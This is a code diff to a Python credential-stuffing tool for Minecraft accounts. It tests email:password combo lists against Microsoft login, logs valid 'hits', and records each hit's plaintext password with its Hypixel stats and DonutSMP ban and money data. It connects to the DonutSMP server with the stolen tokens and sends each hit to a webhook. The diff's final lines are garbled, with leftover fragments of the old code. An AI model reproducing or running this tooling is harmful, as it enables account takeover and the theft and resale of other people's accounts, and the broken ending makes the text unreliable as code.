@@ -1,10 +1,8 @@
 import os, time, re, json, socket, random, urllib3, warnings, uuid, threading, sys
 from datetime import datetime, timezone
 from urllib.parse import urlparse, parse_qs
-from io import StringIO
 import requests
 
-# --- Minecraft Protocol Imports & Monkeypatching for DonutSMP ---
 import minecraft
 from minecraft import Version, initglobals
 from minecraft.networking.connection import Connection
@@ -16,7 +14,6 @@ from minecraft.networking.types import String, UUID
 urllib3.disable_warnings()
 warnings.filterwarnings("ignore")
 
-# Monkeypatch protocol 764 (Minecraft 1.20.2+)
 if not any(v.protocol == 764 for v in minecraft.KNOWN_MINECRAFT_VERSION_RECORDS):
     minecraft.KNOWN_MINECRAFT_VERSION_RECORDS.extend([
         Version('1.20.2', 764, True),
@@ -81,14 +78,15 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
         pass
     return "None", session
 
-# --- 1. HYPIXEL STATS SCRAPER (Plancke.io) ---
+# --- HYPIXEL STATS SCRAPER ---
 def check_hypixel_stats(name):
     stats = {
         "level": "N/A",
         "first_login": "N/A",
         "last_login": "N/A",
         "bw_stars": "N/A",
-        "rank": "Default"
+        "rank": "Default",
+        "playtime": "N/A"
     }
     try:
         headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
@@ -106,16 +104,27 @@ def check_hypixel_stats(name):
         m_bw = re.search(r'<li><b>Level:</b> (.+?)</li>', tx)
         if m_bw: stats["bw_stars"] = m_bw.group(1)
 
-        m_rank = re.search(r'Rank:</b> <span[^>]*>(.*?)<\/span>', tx)
-        if m_rank: stats["rank"] = m_rank.group(1)
+        m_rank = re.search(r'<b>Rank:</b>\s*([^<]+)', tx)
+        if m_rank: stats["rank"] = m_rank.group(1).strip()
     except:
         pass
     return stats
 
-# --- 2. DONUTSMP SOCKET BAN CHECKER ---
+# --- DONUTSMP SOCKET & WEB STATS CHECKER (Nexus V2 Logic) ---
 def check_donutsmp_status(mc_name, mc_uuid, mc_token):
     result = None
-    ban_details = "Unbanned"
+    disconnect_message = None
+    donut_data = {
+        "status": "Unbanned",
+        "reason": "None",
+        "time_left": "None",
+        "ban_id": "None",
+        "money": "N/A",
+        "playtime": "N/A",
+        "kills": "N/A",
+        "deaths": "N/A"
+    }
+    
     auth_token = AuthenticationToken(username=mc_name, access_token=mc_token, client_token=uuid.uuid4().hex)
     auth_token.profile = Profile(id_=mc_uuid, name=mc_name)
     
@@ -124,22 +133,10 @@ def check_donutsmp_status(mc_name, mc_uuid, mc_token):
 
         @connection.listener(clientbound.login.DisconnectPacket, early=True)
         def login_disconnect(packet):
-            nonlocal result, ban_details
+            nonlocal result, disconnect_message
             try: msg = str(packet.json_data)
             except: msg = ""
-            clean = extract_chat_text(msg)
-            clean = re.sub(r'§.', '', clean)
-            
-            reason_match = re.search(r'(You are .+?)(?:\\n|\n|$)', clean)
-            reason = reason_match.group(1).strip() if reason_match else clean.strip()
-            
-            time_match = re.search(r'(?:Time Left|Duration|Expires):?\s*([^\n\\]+)', clean, re.I)
-            time_left = time_match.group(1).strip() if time_match else "N/A"
-            
-            banid_match = re.search(r'Ban ID:?\s*#?([^\n\\]+)', clean, re.I)
-            ban_id = banid_match.group(1).strip() if banid_match else "N/A"
-            
-            ban_details = f"Banned | Reason: {reason} | Time Left: {time_left} | Ban ID: {ban_id}"
+            disconnect_message = msg
             result = "banned"
 
         @connection.listener(clientbound.login.LoginSuccessPacket, early=True)
@@ -173,37 +170,78 @@ def check_donutsmp_status(mc_name, mc_uuid, mc_token):
         except: pass
 
         if result == "unbanned":
-            return "Unbanned"
+            donut_data["status"] = "Unbanned"
         elif result == "banned":
-            return ban_details
-    except Exception as e:
-        return f"Unbanned / Cloud Firewall Restricted"
-    
-    return "Unbanned"
+            donut_data["status"] = "Banned"
+            if disconnect_message:
+                clean = re.sub(r'§.', '', disconnect_message)
+                text_parts = re.findall(r'"text"\s*:\s*"([^"]+)"', disconnect_message)
+                if text_parts:
+                    full_text = ' '.join(text_parts)
+                    clean_full = full_text.replace('\\n', '\n').replace('\\r', '')
+                    clean_full = re.sub(r'[§&$][0-9a-fk-or]', '', clean_full, flags=re.IGNORECASE)
+                    reason_match = re.search(r'\[([^\]]+)\]', clean_full)
+                    if reason_match:
+                        donut_data["reason"] = reason_match.group(1).strip()
+                    else:
+                        ban_texts = [t.strip() for t in text_parts if len(t.strip()) > 5 and 'banned' in t.lower()]
+                        donut_data["reason"] = ban_texts[0][:150] if ban_texts else "Banned"
+                
+                time_match = re.search(r'Time Left:\s*([^\\]+?)(?:Ban ID|$)', disconnect_message, re.IGNORECASE)
+                if time_match:
+                    donut_data["time_left"] = time_match.group(1).strip()
+                
+                banid_match = re.search(r'(?:Ban ID|ID)\s*:\s*[§&$]?[0-9a-fk-or]?(#?[A-Za-z0-9]+)', disconnect_message, re.IGNORECASE)
+                if banid_match:
+                    donut_data["ban_id"] = banid_match.group(1).strip()
 
-# --- MAIN RUN FUNCTION CALLED BY app.py ---
+        # Fetch additional stats from DonutSMP web stats API
+        try:
+            stat_urls = [
+                f"https://stats.donutsmp.net/player/{mc_name}",
+                f"https://donutsmp.net/stats/{mc_name}"
+            ]
+            for url in stat_urls:
+                try:
+                    res = requests.get(url, timeout=3, verify=False)
+                    if res.status_code == 200 and len(res.text) > 100:
+                        st_text = res.text
+                        m_money = re.search(r'(?:money|balance|coins?)\D*([\d,]+)', st_text, re.IGNORECASE)
+                        if m_money: donut_data["money"] = f"${m_money.group(1)}"
+                        
+                        m_play = re.search(r'(?:playtime|time played)\D*([\d]+\s*(?:hours?|days?|minutes?))', st_text, re.IGNORECASE)
+                        if m_play: donut_data["playtime"] = m_play.group(1)
+                        
+                        m_kills = re.search(r'kills?\D*([\d,]+)', st_text, re.IGNORECASE)
+                        if m_kills: donut_data["kills"] = m_kills.group(1)
+                        
+                        m_deaths = re.search(r'deaths?\D*([\d,]+)', st_text, re.IGNORECASE)
+                        if m_deaths: donut_data["deaths"] = m_deaths.group(1)
+                        break
+                except:
+                    continue
+        except:
+            pass
+
+    except Exception:
+        donut_data["status"] = "Unbanned / Firewall Restricted"
+    
+    return donut_data
+
 def run(input_path, output_path, user_webhook=None):
     res_dir = os.path.dirname(output_path)
     os.makedirs(res_dir, exist_ok=True)
     
-    if not os.path.exists(input_path):
-        return
+    if not os.path.exists(input_path): return
 
     with open(input_path, 'r', encoding='utf-8', errors='replace') as f:
         lines = [line.strip() for line in f if line.strip()]
 
-    hits_list = []
-    bad_list = []
-    capture_list = []
+    hits_list, bad_list, capture_list = [], [], []
 
     for line in lines:
-        if ":" not in line:
-            continue
-        parts = line.strip().split(":", 1)
-        email = parts[0]
-        password = parts[1]
-        
-        print(f"[*] Trying account: {email}")
+        if ":" not in line: continue
+        email, password = line.strip().split(":", 1)
         
         session = requests.Session()
         urlPost, sFTTag, session = get_urlPost_sFTTag(session)
@@ -216,15 +254,14 @@ def run(input_path, output_path, user_webhook=None):
             bad_list.append(line)
             continue
         
-        print("[+] SUCCESS! Valid Microsoft Account Found!")
         hits_list.append(line)
         
         name = "Minecraft Account"
         player_uuid = ""
         cape_list = "None"
         hypixel_stats = {"level": "N/A", "first_login": "N/A", "last_login": "N/A", "bw_stars": "N/A", "rank": "Default"}
-        donut_status = "Not Checked"
-      
+        donut_info = {"status": "Unbanned", "reason": "None", "time_left": "None", "ban_id": "None", "money": "N/A", "playtime": "N/A", "kills": "N/A", "deaths": "N/A"}
+
         try:
             r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=5)
             if r.status_code == 200:
@@ -232,17 +269,64 @@ def run(input_path, output_path, user_webhook=None):
                 name = data.get("name", "Minecraft Account")
                 player_uuid = data.get("id", "")
                 found_capes = [c.get("alias", "") for c in data.get("capes", [])]
-                if found_capes:
-                    cape_list = ", ".join(found_capes)
+                if found_capes: cape_list = ", ".join(found_capes)
                 
-                # Fetch Hypixel Stats via Plancke
                 hypixel_stats = check_hypixel_stats(name)
-                
-                # Fetch DonutSMP Ban Status via Socket
                 if player_uuid:
-                    donut_status = check_donutsmp_status(name, player_uuid, token)
-            else:
-                name = "No Minecraft Java"
+                    donut_info = check_donutsmp_status(name, player_uuid, token)
+        except:
+            pass
+        
+        cap_block = (
+            f"Email: {email}\n"
+            f"Password: {password}\n"
+            f"Name: {name}\n"
+            f"UUID: {player_uuid}\n"
+            f"Capes: {cape_list}\n"
+            f"DonutSMP Status: {donut_info['status']} | Reason: {donut_info['reason']} | Time Left: {donut_info['time_left']} | Ban ID: {donut_info['ban_id']}\n"
+            f"Donut Money: {donut_info['money']} | Playtime: {donut_info['playtime']} | Kills: {donut_info['kills']} | Deaths: {donut_info['deaths']}\n"
+            f"Hypixel Rank: {hypixel_stats['rank']}\n"
+            f"Hypixel Level: {hypixel_stats['level']}\n"
+            f"BedWars Stars: {hypixel_stats['bw_stars']}\n"
+            f"First Login: {hypixel_stats['first_login']}\n"
+            f"Last Login: {hypixel_stats['last_login']}\n"
+            f"============================\n"
+        )
+        capture_list.append(cap_block)
+
+        try:
+            from app import send_hit_notification
+            send_hit_notification(
+                email=email,
+                password=password,
+                account_type="Minecraft Java",
+                capes=cape_list,
+                hypixel_level=hypixel_stats['level'],
+                hypixel_rank=hypixel_stats['rank'],
+                donut_status=donut_info['status'],
+                donut_reason=donut_info['reason'],
+                donut_time=donut_info['time_left'],
+                donut_money=donut_info['money'],
+                donut_playtime=donut_info['playtime'],
+                user_webhook_url=user_webhook
+            )
+        except:
+            pass
+
+    hits_file_path = os.path.join(res_dir, "Hits.txt")
+    with open(hits_file_path, 'w', encoding='utf-8') as h_file:
+        h_file.write("\n".join(hits_list) + ("\n" if hits_list else ""))
+
+    final_output = ["=== HITS [+] ===\n"]
+    final_output.extend([f"{h}\n" for h in hits_list] if hits_list else ["No hits found.\n"])
+    final_output.append("\n=== BAD [-] ===\n")
+    final_output.extend([f"{b}\n" for b in bad_list] if bad_list else ["No bad combos.\n"])
+    final_output.append("\n=== CAPTURES ===\n")
+    final_output.extend(capture_list if capture_list else ["No captures available.\n"])
+
+    with open(output_path, 'w', encoding='utf-8', errors='replace') as out:
+        out.writelines(final_output)
+craft Java"
                 donut_status = "No Game Ownership"
         except Exception as e:
             name = "Profile Error"
